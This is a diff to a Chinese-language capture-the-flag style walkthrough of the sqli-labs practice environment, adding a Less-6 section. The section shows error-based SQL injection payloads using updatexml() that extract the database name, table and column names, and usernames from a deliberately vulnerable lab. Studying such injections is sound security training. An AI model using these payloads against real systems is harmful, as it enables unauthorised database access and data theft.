@@ -3065,6 +3065,71 @@ Table: users
 +----------+------------+
 ```
 
-显然，用`sqlmap`爆破求解会更加方便。
+显然，用`sqlmap`爆破求解会更加方便，但是平时练习的时候还是手动注入吧。
+
+”**青铜刀锋，不轻易用，苍生为重。**“
 
 ------
+
+### Less-6
+
+本题小标题：**GET - Double lnjection - Double quotes - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+不想写这么详细了，简单记录即可，闭合字符是`"`。
+
+输入`?id=1"`回显如下：
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1
+
+输入`?id=1"--+`回显如下：
+
+> You are in...........
+
+输入`?id=1" order by 3--+`知道数据有`3`列。
+
+输入`?id=-1" union select 1,2,3--+`可以看到回显结果依旧是You are in...........。
+
+由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。
+
+`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。例如可以利用`database()`回显当前连接的数据库。
+
+```sql
+?id=1" and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+```
+
+> XPATH syntax error: '~security~'
+
+知道数据库名是`security`后，继续利用报错注入得到数据表名。
+
+```sql
+?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
+```
+
+> XPATH syntax error: '~emails,referers,uagents,users~'
+
+继续爆破得到数据列名信息。
+
+```sql
+?id=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+
+```
+
+> XPATH syntax error: '~id,username,password~'
+
+最后爆破指定数据字段信息，可以看到显示并不完全。
+
+```sql
+?id=1" and updatexml(1,concat(0x7e,(select group_concat(username) from security.users),0x7e),1)--+
+```
+
+> XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stup'
+
+还是那句话，用`sqlmap`爆破求解会更加方便，但是平时练习的时候还是手动注入吧。
+
+”**青铜刀锋，不轻易用，苍生为重。**“
+
+------
+
